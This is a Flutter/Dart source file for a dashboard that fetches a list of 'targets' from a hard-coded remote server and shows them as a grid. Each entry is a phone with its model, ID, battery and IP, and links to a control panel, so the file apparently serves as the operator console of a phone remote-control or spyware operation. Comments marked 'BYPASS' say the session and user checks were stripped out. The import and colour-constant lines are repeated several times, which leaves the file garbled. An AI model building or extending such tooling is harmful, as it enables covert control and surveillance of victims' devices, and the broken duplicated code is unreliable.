import 'package:flutter/material.dart';

// MANTA'X COLORS
const Color _primaryGreen = Color(0xFF00FF88);
const Color _secondaryCyan = Color(0xFF00FFFF);
const Color _accentMagenta = Color(0xFFFF00FF);
const Color _darkBg = Color(0xFF050505);
import 'package:http/http.dart' as http;

// MANTA'X COLORS
const Color _primaryGreen = Color(0xFF00FF88);
const Color _secondaryCyan = Color(0xFF00FFFF);
const Color _accentMagenta = Color(0xFFFF00FF);
const Color _darkBg = Color(0xFF050505);
import 'dart:convert';

// MANTA'X COLORS
const Color _primaryGreen = Color(0xFF00FF88);
const Color _secondaryCyan = Color(0xFF00FFFF);
const Color _accentMagenta = Color(0xFFFF00FF);
const Color _darkBg = Color(0xFF050505);
import 'dart:async';

// MANTA'X COLORS
const Color _primaryGreen = Color(0xFF00FF88);
const Color _secondaryCyan = Color(0xFF00FFFF);
const Color _accentMagenta = Color(0xFFFF00FF);
const Color _darkBg = Color(0xFF050505);
// BYPASS: Import SharedPreferences dihapus sepenuhnya

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  
  // BYPASS: Variabel _adminUser dihapus karena tidak lagi diperlukan

  @override
  void initState() {
    super.initState();
    // BYPASS: Langsung eksekusi pemanggilan data. Tidak ada cek sesi.
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      // BYPASS: Endpoint bersih dari parameter "?username="
      final response = await http.get(
        Uri.parse("http://papi.queen-priv.my.id:2417/api/list-targets"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    // Menghitung device aktif (Bisa disesuaikan dengan parameter API asli)
    int activeCount = _devices.isNotEmpty ? 1 : 0; 

    return Scaffold(
      backgroundColor: const Color(0xFF0A0C10), // Warna dasar gelap
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // --- TOP HEADER MATRIX ---
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF12161E),
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(bottom: BorderSide(color: Colors.green.withOpacity(0.2))),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("ACTIVE TARGETS", style: TextStyle(color: Colors.green, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("$activeCount", style: const TextStyle(color: Colors.greenAccent, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar, color: Colors.greenAccent.withOpacity(0.8), size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          const Text("TOTAL DEVICES", style: TextStyle(color: Colors.white54, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("${_devices.length}", style: const TextStyle(color: Colors.greenAccent, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 15),
                
                // --- SUBHEADER ---
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text(
                        "CONNECTED DEVICES", 
                        style: TextStyle(color: Colors.greenAccent, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5)
                      ),
                      GestureDetector(
                        // BYPASS: Logout diubah menjadi Pop Context untuk menutup dashboard
                        onTap: () => Navigator.pop(context), 
                        child: const Icon(Icons.close, color: _primaryGreen, size: 18),
                      )
                    ],
                  ),
                ),
                
                const SizedBox(height: 10),

                // --- GRID DATA ---
                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Colors.greenAccent))
                    : _devices.isEmpty 
                      ? const Center(
                          child: Text("NO TARGETS FOUND", 
                          style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold, letterSpacing: 2)))
                      : GridView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3, // 3 Kolom sesuai gambar
                            crossAxisSpacing: 8,
                            mainAxisSpacing: 8,
                            childAspectRatio: 0.75, // Rasio tinggi kotak
                          ),
                          itemCount: _devices.length,
                          itemBuilder: (context, index) {
                            final device = _devices[index];
                            
                            // Visualisasi: Jadikan item pertama 'ON'
                            bool isActive = index == 0; 
                            Color statusColor = isActive ? Colors.greenAccent : _primaryGreen;

                            return GestureDetector(
                              onTap: () {
                                Navigator.pushNamed(
                                  context, 
                                  '/control_panel', 
                                  arguments: device 
                                );
                              },
                              child: Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: const Color(0xFF0F1116),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: isActive ? Colors.greenAccent.withOpacity(0.5) : Colors.white12,
                                    width: 1,
                                  ),
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    // Row 1: Icon HP & Indikator ON/OFF
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        const Icon(Icons.phone_android, color: Colors.white54, size: 14),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                                          decoration: BoxDecoration(
                                            border: Border.all(color: statusColor.withOpacity(0.5)),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Row(
                                            children: [
                                              CircleAvatar(radius: 2.5, backgroundColor: statusColor),
                                              const SizedBox(width: 3),
                                              Text(
                                                isActive ? "ON" : "OFF", 
                                                style: TextStyle(color: statusColor, fontSize: 6, fontWeight: FontWeight.bold)
                                              ),
                                            ],
                                          ),
                                        ),
                                      ],
                                    ),
                                    
                                    const Spacer(),
                                    
                                    // Row 2: Nama & ID Device
                                    Text(
                                      device['model'] ?? "Unknown",
                                      style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 2),
                                    Text(
                                      device['id'] ?? "NO-ID",
                                      style: const TextStyle(color: Colors.white24, fontSize: 7),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    
                                    const Spacer(),
                                    
                                    // Row 3: Battery & Log
                                    Row(
                                      children: [
                                        const Icon(Icons.battery_charging_full, color: Colors.white54, size: 10),
                                        const SizedBox(width: 2),
                                        Text(
                                          "${device['battery'] ?? '0'}%", 
                                          style: const TextStyle(color: Colors.white70, fontSize: 8, fontWeight: FontWeight.bold)
                                        ),
                                      ],
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      "IP: ${device['ip'] ?? '172.10.0.1'}", 
                                      style: const TextStyle(color: Colors.white24, fontSize: 6),
                                      maxLines: 1,
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}